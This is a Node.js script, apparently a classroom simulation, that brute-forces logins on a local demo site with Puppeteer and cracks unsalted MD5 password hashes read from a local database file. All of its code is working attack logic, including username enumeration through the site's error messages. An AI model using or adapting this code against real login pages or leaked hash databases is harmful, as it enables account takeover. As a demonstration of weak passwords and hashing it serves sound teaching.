const puppeteer = require('puppeteer');
const fs = require('fs');
const readline = require("readline");
const crypto = require('crypto');

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
  });

(async () => {
    console.log("Bem vindo à simulação de ataque de força bruta.");
    console.log("Digite 1 para simular um ataque ao website.");
    console.log("Digite 2 para simular um atacante que já possui acesso aos dados.");
    console.log("Digite qualquer outra tecla para terminar.");    
    rl.question("Escolha uma opção:", async (answer) => {
        switch(answer){
            case "1":
                await simulateWebsiteAttack();
                break;
            case "2":
                await simulateAttackerHasAccessToDB();
                break;
            default:
                return;
        }
    })    
})()

const simulateAttackerHasAccessToDB = async function(){
    try{
        let db = JSON.parse(fs.readFileSync('../Server/db.json', 'utf8'));
        let userNames = Object.keys(db);
        console.log(db);
        console.log("Foram encontrados " + userNames.length + " usuários.");
        for(let userName of userNames){
            console.log("Iniciando força bruta para o usuário: " + userName);
            let initialDate = new Date();
            let passwordHash = db[userName].password;
            breakMD5(passwordHash, userName);
            let endDate = new Date();
            console.log("Força bruta finalizada em: " + (endDate - initialDate) + "ms para o usuário: " + userName);
        }
        console.log("Força bruta finalizada.");
    }catch(e){
        console.error(e);
    }
}

const breakMD5 = async function(passwordHash, userName){
    for(let p1 = 0; p1 < charactersArray.length; p1++){
        for(let p2 = 0; p2 < charactersArray.length; p2++){
            for(let p3 = 0; p3 < charactersArray.length; p3++){
                for(let p4 = 0; p4 < charactersArray.length; p4++){
                    let password = generateNextFourCharacterStringOrdered(p1, p2, p3, p4);
                    let md5HashedPassword = md5(password);
                    if(md5HashedPassword == passwordHash){
                        console.log("Senha encontrada: " + userName + ":" + password);
                        writeUserNamePasswordToLocalFile(userName, password);
                        return;
                    }
                }
            }
        }
    }
}

const md5 = function (string){
    return crypto.createHash("md5").update(string).digest("hex");
}

const simulateWebsiteAttack = async function(){
    const browser = await puppeteer.launch({ headless:false});
    try{
        console.log("Iniciando simulação de força bruta em um website.");
        const executionStartedDate = new Date();        
        const page = await browser.newPage();
        await page.goto('http://localhost:3000/login');
        for(let p1 = 0; p1 < charactersArray.length; p1++){
            for(let p2 = 0; p2 < charactersArray.length; p2++){
                for(let p3 = 0; p3 < charactersArray.length; p3++){
                    for(let p4 = 0; p4 < charactersArray.length; p4++){
                        let userName = generateNextFourCharacterStringOrdered(p1, p2, p3, p4);
                        await findPassword(userName, page);
                    }
                }
            }
        }        
        const executionEndedDate = new Date();
        console.log("Força bruta finalizada em: " + (executionEndedDate - executionStartedDate) + "ms");
        await browser.close();
        console.log('Fim da força bruta!');
    }catch(e){
        await browser.close();
        console.error(e);
    }
}

const charactersArray = [
    "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
    "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z",
    "0", "1", "2", "3", "4", "5", "6", "7", "8", "9",
    "@", "!", "~", "?", "[", "]", "{", "}", "(", ")", "*", "+", "-", "=", "&", "^", "%", "$", "#", ".", ",", ":", ";", "/", "|", "\\", "\"", "'", "`", ">", "<", " ",
]

async function findPassword(userName, page){
    for(p1 = 0; p1 < charactersArray.length; p1++){
        for(p2 = 0; p2 < charactersArray.length; p2++){
            for(p3 = 0; p3 < charactersArray.length; p3++){
                for(p4 = 0; p4 < charactersArray.length; p4++){
                    const password = generateNextFourCharacterStringOrdered(p1, p2, p3, p4);
                    await page.evaluate(() => document.querySelector('#formPassword').value = '');
                    await page.evaluate(() => document.querySelector('#formName').value = '');
                    await page.type('#formName', userName);
                    await page.type('#formPassword', password);
                    await page.click('#loginButton');
                    await sleep(20);
                    let success = await page.evaluate(() => {
                        return document.querySelector('#successMessage') !== null
                    });
                    if(success){
                        writeUserNamePasswordToLocalFile(userName, password);
                        console.log("Senha encontrada: " + userName + ":" + password);
                        pressCloseButton(page);
                        return;
                    } else {
                        let message = await page.evaluate(() => {
                            let messageContainer = document.querySelector('#failMessage');
                            if(messageContainer !== null){
                                return messageContainer.innerText;
                            }
                            return "";
                        });
                        await pressCloseButton(page);
                        if(message == "Usuário não encontrado!"){
                            return;
                        }
                        console.log("Senha incorreta: " + userName + ":" + password);
                    }
                }
            }
        }
    }
}

const pressCloseButton = async (page) => {
    await page.evaluate(() => {
        let buttonClose = document.querySelector('.btn-close');
        if(buttonClose){
            buttonClose.click();
        }
    });
}

const sleep = async function (ms){
    return new Promise(resolve => setTimeout(resolve, ms));
}

const generateNextFourCharacterStringOrdered = (p1 = 0, p2 = 0, p3 = 0, p4 = 0) => {
    return charactersArray[p1] + charactersArray[p2] + charactersArray[p3] + charactersArray[p4];
}

const writeUserNamePasswordToLocalFile = function(userName, password){
    let data = JSON.parse(fs.readFileSync('login.json', 'utf8'));
    data[userName] = password;
    fs.writeFileSync("login.json", JSON.stringify(data));
}